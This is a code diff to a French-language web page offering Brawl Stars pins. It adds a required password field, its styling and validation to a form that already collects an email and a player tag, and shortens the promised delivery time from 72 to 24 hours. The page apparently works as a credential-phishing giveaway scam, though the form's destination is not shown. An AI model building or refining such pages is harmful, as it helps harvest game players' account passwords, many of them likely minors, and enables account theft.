@@ -87,7 +87,8 @@
         }
 
         input[type="email"],
-        input[type="text"] {
+        input[type="text"],
+        input[type="password"] {
             width: 100%;
             padding: 18px 20px;
             background: rgba(255, 255, 255, 0.1);
@@ -99,12 +100,14 @@
         }
 
         input[type="email"]::placeholder,
-        input[type="text"]::placeholder {
+        input[type="text"]::placeholder,
+        input[type="password"]::placeholder {
             color: rgba(255, 255, 255, 0.5);
         }
 
         input[type="email"]:focus,
-        input[type="text"]:focus {
+        input[type="text"]:focus,
+        input[type="password"]:focus {
             outline: none;
             border-color: #4facfe;
             background: rgba(255, 255, 255, 0.15);
@@ -295,6 +298,11 @@
                 </div>
 
                 <div class="form-group">
+                    <label for="password">🔐 Mot de passe</label>
+                    <input type="password" id="password" name="mot_de_passe" required placeholder="Votre mot de passe">
+                </div>
+
+                <div class="form-group">
                     <label for="userId">🏷️ Tag Brawl Stars</label>
                     <input type="text" id="userId" name="tag_brawl_stars" required placeholder="#ABC123XYZ">
                 </div>
@@ -322,7 +330,7 @@
             <div class="feature">
                 <span class="feature-icon">⚡</span>
                 <h4>Rapide</h4>
-                <p>Distribution en moins de 72h</p>
+                <p>Distribution en moins de 24h</p>
             </div>
             <div class="feature">
                 <span class="feature-icon">🔒</span>
@@ -348,6 +356,7 @@
 
         document.getElementById('pinsForm').addEventListener('submit', function(e) {
             const email = document.getElementById('email').value.trim();
+            const password = document.getElementById('password').value.trim();
             const userId = document.getElementById('userId').value.trim();
             const successMessage = document.getElementById('successMessage');
             const errorMessage = document.getElementById('errorMessage');
@@ -357,7 +366,7 @@
             errorMessage.style.display = 'none';
             
             // Validation basique avant l'envoi
-            if (!email || !userId) {
+            if (!email || !password || !userId) {
                 e.preventDefault();
                 errorMessage.textContent = '❌ Veuillez remplir tous les champs.';
                 errorMessage.style.display = 'block';
@@ -367,6 +376,13 @@
             if (!email.includes('@')) {
                 e.preventDefault();
                 errorMessage.textContent = '❌ Email invalide.';
+                errorMessage.style.display = 'block';
+                return;
+            }
+            
+            if (password.length < 4) {
+                e.preventDefault();
+                errorMessage.textContent = '❌ Mot de passe trop court (minimum 4 caractères).';
                 errorMessage.style.display = 'block';
                 return;
             }
